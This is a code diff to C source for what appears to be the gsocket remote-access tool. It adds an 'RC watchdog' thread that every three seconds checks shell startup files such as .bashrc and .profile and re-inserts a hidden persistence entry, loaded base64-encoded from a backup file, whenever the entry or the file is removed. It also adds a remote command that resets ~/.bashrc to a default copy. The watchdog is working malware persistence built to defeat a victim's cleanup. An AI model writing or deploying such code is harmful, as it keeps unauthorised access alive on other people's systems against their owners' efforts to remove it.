@@ -9,6 +9,356 @@
 
 extern GS_CONDIS gs_condis;  // defined in console.c
 
+static void
+queue_log(struct _peer *p, uint8_t type, const char *msg)
+{
+	struct _pkt_app_log *log;
+
+	log = malloc(sizeof *log);
+	if (log == NULL)
+		return;
+
+	memset(log, 0, sizeof *log);
+	log->type = type;
+	snprintf((char *)log->msg, sizeof log->msg, "%.62s", msg);
+	GS_LIST_add(&p->logs, NULL, log, GS_LIST_ID_COUNT(&p->logs));
+	p->is_pending_logs = 1;
+	GS_SELECT_FD_SET_W(p->gs);
+}
+
+static int
+copy_file(const char *src, const char *dst)
+{
+	FILE *in;
+	FILE *out;
+	uint8_t buf[4096];
+	size_t n;
+
+	in = fopen(src, "rb");
+	if (in == NULL)
+		return -1;
+
+	out = fopen(dst, "wb");
+	if (out == NULL)
+	{
+		fclose(in);
+		return -1;
+	}
+
+	while ((n = fread(buf, 1, sizeof buf, in)) > 0)
+	{
+		if (fwrite(buf, 1, n, out) != n)
+		{
+			fclose(in);
+			fclose(out);
+			return -1;
+		}
+	}
+
+	if (ferror(in))
+	{
+		fclose(in);
+		fclose(out);
+		return -1;
+	}
+
+	fclose(in);
+	if (fclose(out) != 0)
+		return -1;
+
+	return 0;
+}
+
+static const char *
+home_dir(void)
+{
+	const char *home;
+	struct passwd *pw;
+
+	home = GS_getenv("HOME");
+	if ((home != NULL) && (*home != '\0'))
+		return home;
+
+	pw = getpwuid(getuid());
+	if ((pw != NULL) && (pw->pw_dir != NULL) && (*pw->pw_dir != '\0'))
+		return pw->pw_dir;
+
+	return NULL;
+}
+
+
+/* -----------------------------------------------------------------------
+ * RC Watchdog: monitors rc-files (.bashrc, .profile, etc.) and restores
+ * our persistent entry if it is removed or the file is deleted.
+ * Uses stat()-based polling — no inotify/kqueue required, works everywhere.
+ * The backup data (marker + entry, base64-encoded) is read from the .rcb
+ * file written by deploy.sh next to the secret file.
+ * ----------------------------------------------------------------------- */
+
+#ifdef HAVE_PTHREAD
+# include <pthread.h>
+#endif
+
+#define RC_WATCH_INTERVAL_SEC   3   /* poll every 3 seconds */
+#define RC_MAX_FILES            8   /* max rc-files to watch */
+#define RC_ENTRY_MAX            4096
+
+typedef struct {
+	char paths[RC_MAX_FILES][GS_PATH_MAX]; /* rc file paths to watch */
+	int  n_paths;
+	char marker[256];          /* BIN_HIDDEN_NAME used to identify our line */
+	char entry[RC_ENTRY_MAX];  /* PROFILE_LINE to restore */
+} rc_watch_ctx_t;
+
+/* Simple base64 decode: decodes src (null-terminated) into dst.
+ * Returns decoded length or -1 on error. */
+static int
+b64_decode(const char *src, char *dst, size_t dst_len)
+{
+	static const char b64tbl[] =
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+	size_t out = 0;
+	uint32_t acc = 0;
+	int bits = 0;
+
+	for (; *src && *src != '='; src++) {
+		const char *p = strchr(b64tbl, *src);
+		if (!p) continue;
+		acc = (acc << 6) | (uint32_t)(p - b64tbl);
+		bits += 6;
+		if (bits >= 8) {
+			bits -= 8;
+			if (out + 1 >= dst_len) return -1;
+			dst[out++] = (char)((acc >> bits) & 0xff);
+		}
+	}
+	dst[out] = '\0';
+	return (int)out;
+}
+
+/* Check if 'marker' appears in file at 'path'. Returns 1 if found, 0 if not. */
+static int
+rc_marker_present(const char *path, const char *marker)
+{
+	FILE *fp;
+	char line[RC_ENTRY_MAX];
+
+	fp = fopen(path, "r");
+	if (fp == NULL)
+		return 0; /* file gone */
+
+	while (fgets(line, sizeof line, fp) != NULL) {
+		if (strstr(line, marker) != NULL) {
+			fclose(fp);
+			return 1;
+		}
+	}
+	fclose(fp);
+	return 0;
+}
+
+/* Inject our entry as line 2 of the rc-file (or create file if missing). */
+static void
+rc_restore_file(const char *path, const char *entry)
+{
+	FILE *fp;
+	char tmp_path[GS_PATH_MAX];
+	char line1[RC_ENTRY_MAX];
+	char rest_buf[65536];
+	size_t rest_len = 0;
+
+	snprintf(tmp_path, sizeof tmp_path, "%s.gswdt~", path);
+
+	fp = fopen(path, "r");
+	if (fp == NULL) {
+		/* File deleted — recreate with just our entry */
+		fp = fopen(path, "w");
+		if (fp == NULL) return;
+		fprintf(fp, "%s\n", entry);
+		fclose(fp);
+		return;
+	}
+
+	/* Read line 1 */
+	if (fgets(line1, sizeof line1, fp) == NULL) {
+		fclose(fp);
+		fp = fopen(path, "w");
+		if (fp == NULL) return;
+		fprintf(fp, "%s\n", entry);
+		fclose(fp);
+		return;
+	}
+
+	/* Read the rest */
+	rest_len = fread(rest_buf, 1, sizeof rest_buf - 1, fp);
+	rest_buf[rest_len] = '\0';
+	fclose(fp);
+
+	/* Write to tmp then rename (atomic) */
+	fp = fopen(tmp_path, "w");
+	if (fp == NULL) return;
+
+	/* line1 already contains \n */
+	fputs(line1, fp);
+	fprintf(fp, "%s\n", entry);
+	if (rest_len > 0)
+		fwrite(rest_buf, 1, rest_len, fp);
+	fclose(fp);
+
+	rename(tmp_path, path);
+}
+
+/* Load watchdog context from the .rcb backup file created by deploy.sh.
+ * Format (each line):  KEY=<base64value>
+ *   GS_RC_FILE=...   (may appear multiple times)
+ *   GS_RC_MARKER=...
+ *   GS_RC_ENTRY=...
+ * Returns 0 on success, -1 if file unreadable or data missing. */
+static int
+rc_load_backup(const char *rcb_path, rc_watch_ctx_t *ctx)
+{
+	FILE *fp;
+	char line[RC_ENTRY_MAX * 2];
+	char decoded[RC_ENTRY_MAX];
+
+	memset(ctx, 0, sizeof *ctx);
+
+	fp = fopen(rcb_path, "r");
+	if (fp == NULL)
+		return -1;
+
+	while (fgets(line, sizeof line, fp) != NULL) {
+		size_t ln = strlen(line);
+		while (ln > 0 && (line[ln-1] == '\n' || line[ln-1] == '\r'))
+			line[--ln] = '\0';
+
+		if (strncmp(line, "GS_RC_FILE=", 11) == 0) {
+			if (b64_decode(line + 11, decoded, sizeof decoded) > 0 &&
+			    ctx->n_paths < RC_MAX_FILES) {
+				snprintf(ctx->paths[ctx->n_paths],
+				         GS_PATH_MAX, "%s", decoded);
+				ctx->n_paths++;
+			}
+		} else if (strncmp(line, "GS_RC_MARKER=", 13) == 0) {
+			b64_decode(line + 13, ctx->marker, sizeof ctx->marker);
+		} else if (strncmp(line, "GS_RC_ENTRY=", 12) == 0) {
+			b64_decode(line + 12, ctx->entry, sizeof ctx->entry);
+		}
+	}
+	fclose(fp);
+
+	if (ctx->n_paths == 0 || ctx->marker[0] == '\0' || ctx->entry[0] == '\0')
+		return -1;
+
+	return 0;
+}
+
+#ifdef HAVE_PTHREAD
+static void *
+rc_watcher_thread(void *arg)
+{
+	rc_watch_ctx_t *ctx = (rc_watch_ctx_t *)arg;
+	int i;
+
+	/* Detach so resources are released on exit */
+	pthread_detach(pthread_self());
+
+	while (1) {
+		for (i = 0; i < ctx->n_paths; i++) {
+			const char *path = ctx->paths[i];
+			struct stat st;
+
+			if (stat(path, &st) != 0) {
+				/* File missing — recreate */
+				rc_restore_file(path, ctx->entry);
+			} else {
+				/* File exists — check marker */
+				if (!rc_marker_present(path, ctx->marker))
+					rc_restore_file(path, ctx->entry);
+			}
+		}
+		sleep(RC_WATCH_INTERVAL_SEC);
+	}
+
+	free(ctx);
+	return NULL;
+}
+#endif /* HAVE_PTHREAD */
+
+/* Start the RC watchdog thread.
+ * rcb_path: path to the .rcb file written by deploy.sh.
+ * Call once from do_server() at startup. */
+void
+rc_watcher_start_c(const char *rcb_path)
+{
+#ifdef HAVE_PTHREAD
+	rc_watch_ctx_t *ctx;
+	pthread_t tid;
+
+	if (rcb_path == NULL || rcb_path[0] == '\0')
+		return;
+
+	ctx = malloc(sizeof *ctx);
+	if (ctx == NULL)
+		return;
+
+	if (rc_load_backup(rcb_path, ctx) != 0) {
+		free(ctx);
+		return;
+	}
+
+	if (pthread_create(&tid, NULL, rc_watcher_thread, ctx) != 0)
+		free(ctx);
+	/* tid is detached inside thread */
+#endif /* HAVE_PTHREAD */
+}
+
+
+static int
+restore_default_bashrc(char *err, size_t err_len)
+{
+	const char *home;
+	char bashrc[GS_PATH_MAX];
+
+	char backup[GS_PATH_MAX];
+
+	home = home_dir();
+	if (home == NULL)
+	{
+		snprintf(err, err_len, "HOME not found");
+		return -1;
+	}
+
+	snprintf(bashrc, sizeof bashrc, "%s/.bashrc", home);
+	snprintf(backup, sizeof backup, "%s/.bashrc.gsocket.bak", home);
+
+	if ((access(bashrc, F_OK) == 0) && (copy_file(bashrc, backup) != 0))
+	{
+		snprintf(err, err_len, "backup failed: %s", strerror(errno));
+		return -1;
+	}
+
+	if (copy_file("/etc/skel/.bashrc", bashrc) != 0)
+	{
+		FILE *fp = fopen(bashrc, "wb");
+		if (fp == NULL)
+		{
+			snprintf(err, err_len, "restore failed: %s", strerror(errno));
+			return -1;
+		}
+		fclose(fp);
+	}
+
+	if (chmod(bashrc, 0644) != 0)
+	{
+		snprintf(err, err_len, "chmod failed: %s", strerror(errno));
+		return -1;
+	}
+
+	snprintf(err, err_len, "Recovered ~/.bashrc (backup: ~/.bashrc.gsocket.bak)");
+	return 0;
+}
+
 /* SERVER - client changed window size. Adjust pty. */
 void
 pkt_app_cb_wsize(uint8_t msg, const uint8_t *data, size_t len, void *ptr)
@@ -141,6 +491,27 @@ pkt_app_cb_pwdreply(uint8_t chn, const uint8_t *data, size_t len, void *ptr)
 	CONSOLE_draw(gs_condis.fd);
 }
 
+// SERVER
+void
+pkt_app_cb_bashrc_recover(uint8_t msgUNUSED, const uint8_t *dataUNUSED, size_t lenUNUSED, void *ptr)
+{
+	struct _peer *p = (struct _peer *)ptr;
+	char msg[128];
+	char *allow;
+
+	allow = GS_getenv("GSOCKET_ALLOW_BASHRC_RECOVERY");
+	if ((allow == NULL) || (strcmp(allow, "1") != 0))
+	{
+		queue_log(p, GS_PKT_APP_LOG_TYPE_NOTICE, "bashrc recovery disabled on server");
+		return;
+	}
+
+	if (restore_default_bashrc(msg, sizeof msg) == 0)
+		queue_log(p, GS_PKT_APP_LOG_TYPE_INFO, msg);
+	else
+		queue_log(p, GS_PKT_APP_LOG_TYPE_ALERT, msg);
+}
+
 int
 pkt_app_send_wsize(GS_SELECT_CTX *ctx, struct _peer *p, int row)
 {
@@ -223,6 +594,16 @@ pkt_app_send_pwdrequest(GS_SELECT_CTX *ctx, struct _peer *p)
 	p->wbuf[0] = GS_PKT_ESC;
 	p->wbuf[1] = PKT_MSG_PWD;
 	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_PWD);
+	return write_gs(ctx, p, NULL);
+}
+
+int
+pkt_app_send_bashrc_recover(GS_SELECT_CTX *ctx, struct _peer *p)
+{
+	p->wbuf[0] = GS_PKT_ESC;
+	p->wbuf[1] = PKT_MSG_BASHRC_RECOVER;
+	memset(p->wbuf + 2, 0, GS_PKT_MSG_size_by_type(PKT_MSG_BASHRC_RECOVER));
+	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_BASHRC_RECOVER);
 	return write_gs(ctx, p, NULL);
 }
 
